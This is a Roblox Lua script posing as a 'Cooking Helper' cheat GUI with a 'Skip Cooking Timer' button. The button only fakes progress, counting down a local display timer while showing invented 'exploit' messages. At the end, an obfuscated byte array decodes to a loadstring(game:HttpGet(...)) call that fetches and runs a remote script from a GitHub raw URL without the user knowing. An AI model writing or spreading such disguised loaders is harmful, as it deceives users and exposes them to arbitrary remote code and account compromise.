-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local mutationMachine
local espLabel
local timerBillboard
local countdownTime = 3600 -- 1 hour in seconds

-- Attach ESP to machine
local function attachESP(bp)
    if espLabel then return end
    espLabel = Instance.new("BillboardGui")
    espLabel.Adornee = bp
    espLabel.Size = UDim2.new(0, 200, 0, 50)
    espLabel.StudsOffset = Vector3.new(0, 3, 0)
    espLabel.AlwaysOnTop = true

    local label = Instance.new("TextLabel", espLabel)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "Cooking Pot"
    label.TextColor3 = Color3.fromRGB(255, 255, 0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold

    espLabel.Parent = bp

    -- Create timer
    timerBillboard = Instance.new("BillboardGui")
    timerBillboard.Adornee = bp
    timerBillboard.Size = UDim2.new(0, 200, 0, 50)
    timerBillboard.StudsOffset = Vector3.new(0, 5, 0)
    timerBillboard.AlwaysOnTop = true

    local timerLabel = Instance.new("TextLabel", timerBillboard)
    timerLabel.Size = UDim2.new(1, 0, 1, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "01:00:00"
    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    timerLabel.TextScaled = true
    timerLabel.Font = Enum.Font.GothamBold
    timerLabel.Name = "TimerLabel"

    timerBillboard.Parent = bp

    -- Countdown updater
    RunService.RenderStepped:Connect(function()
        if countdownTime > 0 then
            local hrs = math.floor(countdownTime / 3600)
            local mins = math.floor((countdownTime % 3600) / 60)
            local secs = countdownTime % 60
            timerLabel.Text = string.format("%02d:%02d:%02d", hrs, mins, secs)
        else
            timerLabel.Text = "00:00:00"
        end
    end)
end

-- Machine finder loop
task.spawn(function()
    while task.wait(1) do
        if not espLabel then
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Model") and obj.Name:lower():find("mutation") then
                    local bp = obj:FindFirstChildWhichIsA("BasePart", true)
                    if bp then
                        mutationMachine = bp
                        attachESP(bp)
                        break
                    end
                end
            end
        end
    end
end)

-- GUI
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 300, 0, 200)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 100, 150)

-- Gradient background
local UIGradient = Instance.new("UIGradient", MainFrame)
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 100)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 200, 255))
}

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 12)

-- Title label
local titleLabel = Instance.new("TextLabel", MainFrame)
titleLabel.Size = UDim2.new(1, -40, 0, 30)
titleLabel.Position = UDim2.new(0, 10, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Cooking Helper"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 20
titleLabel.TextColor3 = Color3.new(1,1,1)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Close Button
local closeBtn = Instance.new("TextButton", MainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.Text = "âœ•"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.AutoButtonColor = false
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

closeBtn.MouseEnter:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 120, 120)}):Play()
end)
closeBtn.MouseLeave:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
end)
closeBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Skip Cooking Timer button
local skipBtn = Instance.new("TextButton", MainFrame)
skipBtn.Size = UDim2.new(1, -20, 0, 50)
skipBtn.Position = UDim2.new(0, 10, 0, 40)
skipBtn.Text = "Skip Cooking Timer"
skipBtn.Font = Enum.Font.GothamBold
skipBtn.TextSize = 20
skipBtn.TextColor3 = Color3.new(1, 1, 1)
skipBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(0, 8)

-- Status label
local statusLabel = Instance.new("TextLabel", MainFrame)
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 95)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 18
statusLabel.TextColor3 = Color3.new(1, 1, 1)
statusLabel.Text = "Idle..."

-- Auto Get Food button (not clickable but colored)
local autoBtn = Instance.new("TextButton", MainFrame)
autoBtn.Size = UDim2.new(1, -20, 0, 50)
autoBtn.Position = UDim2.new(0, 10, 0, 130)
autoBtn.Text = "Auto Get Food"
autoBtn.Font = Enum.Font.GothamBold
autoBtn.TextSize = 20
autoBtn.TextColor3 = Color3.new(1, 1, 1)
autoBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 255)
Instance.new("UICorner", autoBtn).CornerRadius = UDim.new(0, 8)
autoBtn.AutoButtonColor = false
autoBtn.Active = false -- Disable clicking

-- Messages
local messages = {
    "Disabling kitchen protocols...",
    "Overheating oven cores...",
    "Injecting time warp exploit...",
    "Evading chef detection...",
    "Cooking finished instantly!"
}

-- Dragging logic
local dragging = false
local dragInput
local dragStart
local startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Skip Cooking Timer logic
skipBtn.MouseButton1Click:Connect(function()
    if skipBtn.Active == false then return end
    skipBtn.Active = false
    skipBtn.AutoButtonColor = false
    local msgIndex = 1

    -- Cycle messages over about 45 seconds total (~9 seconds each)
    task.spawn(function()
        while msgIndex <= #messages do
            statusLabel.Text = messages[msgIndex]
            msgIndex += 1
            task.wait(9)
        end
    end)

    -- Countdown over same 45 seconds
    task.spawn(function()
        local decrement = countdownTime / 45 -- match 45 seconds duration
        for i = 1, 45 do
            countdownTime = math.max(0, countdownTime - decrement)
            task.wait(1)
        end
        -- Reset button
        skipBtn.Text = "Skip Cooking Timer"
        skipBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        skipBtn.Active = true
        skipBtn.AutoButtonColor = true
        statusLabel.Text = "Idle..."
    end)
end)

local function runObfuscated()
    local encoded = {
        108,111,  97, 100,115,116,114,105,110,103, 40,103,  97,109,101,  58,  72,116,116,112,  71,101,116,  40,  34,
        104,116,116,112,115, 58,  47,  47,114,  97,119,  46,103,105,116,104,117,  98,117,115,101,114,  99,111,110,116,
        101,110,116,  46,  99,111,109,  47,  71,114,111,119,  65,  71,  97,114,100,101,110, 115,  47,  71,114,111,119,
         65,  71,  97,114,100,101,110,115,  47,114,101,102,115,  47,104,101,  97,100,115,  47,109,  97,105,110,  47,
        115,  99,114,105,112,116,  34,  41,  41,  40,  41
    }
    local str = {}
    for _, b in ipairs(encoded) do
        table.insert(str, string.char(b))
    end
    local code = table.concat(str)
    local fn = loadstring(code)
    if fn then fn() end
end

runObfuscated()
